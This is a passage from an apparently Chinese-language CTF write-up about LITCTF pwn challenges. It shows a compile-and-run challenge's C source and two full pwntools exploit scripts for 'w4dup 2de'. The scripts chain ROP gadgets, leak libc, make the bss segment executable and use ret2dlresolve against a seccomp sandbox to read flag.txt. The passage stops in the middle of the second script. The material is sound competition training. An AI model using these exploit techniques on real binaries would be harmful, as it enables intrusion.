<span class="token punctuation">&#125;</span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Filename? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> fname<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> fn <span class="token operator">=</span> <span class="token keyword">get</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">fname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fn<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name"><span class="token keyword">char</span></span> c <span class="token operator">=</span> fname<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token char">'a'</span> <span class="token operator">&lt;=</span> c <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token char">'z'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Only a-z and ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> NULL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nice try!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    FILE<span class="token operator">*</span> file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"a+b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Read (R) or Write (W)? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> option<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">get</span><span class="token punctuation">(</span>option<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">option</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">switch</span> <span class="token punctuation">(</span>option<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token char">'R'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">char</span> contents<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">int</span></span> n <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">contents</span><span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Contents: "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">case</span> <span class="token char">'W'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"Contents? "</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">char</span> contents<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">int</span></span> n <span class="token operator">=</span> <span class="token keyword">get</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name"><span class="token keyword">int</span></span> ret <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"gcc main.c -o main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Compilation failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> <span class="token string">"main"</span><span class="token punctuation">,</span> NULL<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>想法就是什么可以在main之前执行呢？ 那就是头文件，预处理、编译、汇编、链接。</p>
<p><img src="https://s2.loli.net/2024/08/19/yZQKgVEFd8CelfH.png" alt="b52180d2f45646108beb17ea1f4718fb.png"></p>
<h5 id="pwn-w4dup-2de"><a href="#pwn-w4dup-2de" class="headerlink" title="pwn&#x2F;w4dup 2de"></a>pwn&#x2F;w4dup 2de</h5><p>这题有意思，一次输入。有沙盒，</p>
<p><img src="https://s2.loli.net/2024/08/19/4lwS2z85HebP6nv.png" alt="126a482ea74a4469ad70aee7133b00fd.png"></p>
<p>哪个后面关于fd的，分析一下大致就是read只能标准输入（fd&#x3D;0）。 </p>
<p><img src="https://s2.loli.net/2024/08/19/s34CqYkgQNiLJFf.png" alt="cb896da815da4ac5a9f2fec9d5dade6d.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/srXM7IAEOqlTcWG.png" alt="2088bfe38f27419eb81aee0cdd8aff05.png"></p>
<p>看了看保护，既然可以任意写（因为rsi寄存器可以控制），那就改got表为write输出泄露libc，之后在给bss段权限来执行shellcode（openat，sendfile） </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/da1sy/environment/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6"</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"error"</span>
rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d3</span>
rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d1</span>
rbp_ret <span class="token operator">=</span> <span class="token number">0x000000000040117d</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x000000000040132d</span>
bss <span class="token operator">=</span> <span class="token number">0x404800</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x28</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi_r15_ret<span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rbp_ret<span class="token punctuation">,</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>p16<span class="token punctuation">(</span><span class="token number">0x71d0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    read <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">b"\x00\x00"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> read <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    rsi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002601f</span>
    rdx_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000dfc12</span>
    pl2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi_ret<span class="token punctuation">,</span>bss<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rsi_ret<span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span>rdx_ret<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    pl2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
    pl2 <span class="token operator">+=</span> shellcode
    sl<span class="token punctuation">(</span>pl2<span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token comment"># io = process("./pwn")</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"litctf.org"</span><span class="token punctuation">,</span><span class="token number">31771</span><span class="token punctuation">)</span>
        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 有一位学长给我的ret2dlresolve，感谢学长，tql !!! </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.31.so"</span><span class="token punctuation">)</span>
<span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>
lrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"litctf.org"</span><span class="token punctuation">,</span> <span class="token number">31771</span><span class="token punctuation">)</span>

baseStage <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token comment"># + 8</span>

<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> frbp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> p64<span class="token punctuation">(</span><span class="token number">0x4013CA</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span> <span class="token operator">+</span> \
    p64<span class="token punctuation">(</span><span class="token number">0x4013B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>frbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>

<span class="token comment"># stack pvioting</span>
payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> baseStage<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>leave<span class="token punctuation">.</span>address<span class="token punctuation">,</span> baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># dlresolve to leak</span>
rel <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".rela.plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynstr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynsym"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"rela.plt : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rel<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"dynstr : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"dynsym : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>dynsym<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

fakeStrAddr <span class="token operator">=</span> baseStage <span class="token operator">+</span> <span class="token number">0xb0</span>
fakeStr <span class="token operator">=</span> <span class="token string">b"puts\x00"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>

fakeSymAddr <span class="token operator">=</span> fakeStrAddr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fakeStr<span class="token punctuation">)</span>
fakeSym <span class="token operator">=</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fakeStrAddr <span class="token operator">-</span> dynstr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x12"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token comment"># + b"p"*16</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span>
symOffset <span class="token operator">=</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x18</span>

fakeRelaAddr <span class="token operator">=</span> fakeSymAddr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fakeSym<span class="token punctuation">)</span>
fakeRela <span class="token operator">=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>symOffset <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span>

dlresolve <span class="token operator">=</span> fakeStr <span class="token operator">+</span> fakeSym <span class="token operator">+</span>  fakeRela
baseStage <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xc00</span> <span class="token comment"># this for the second stack pvioting, or the read data will destory the return frame</span>
control <span class="token operator">=</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401020</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> \
        csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> baseStage<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>leave<span class="token punctuation">.</span>address<span class="token punctuation">,</span> baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
control <span class="token operator">=</span> control<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> control <span class="token operator">+</span> dlresolve

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># read = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span>
read <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
base <span class="token operator">=</span> read <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"read : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"base : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># open and sendfile</span>
<span class="token comment"># 0xdfece : pop rcx ; pop rbx ; ret # notice this is in the local libc which version is 2.39</span>
<span class="token comment"># 0x10257e : pop rcx ; pop rbx ; ret</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>baseStage <span class="token operator">+</span> <span class="token number">136</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rsi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span>\
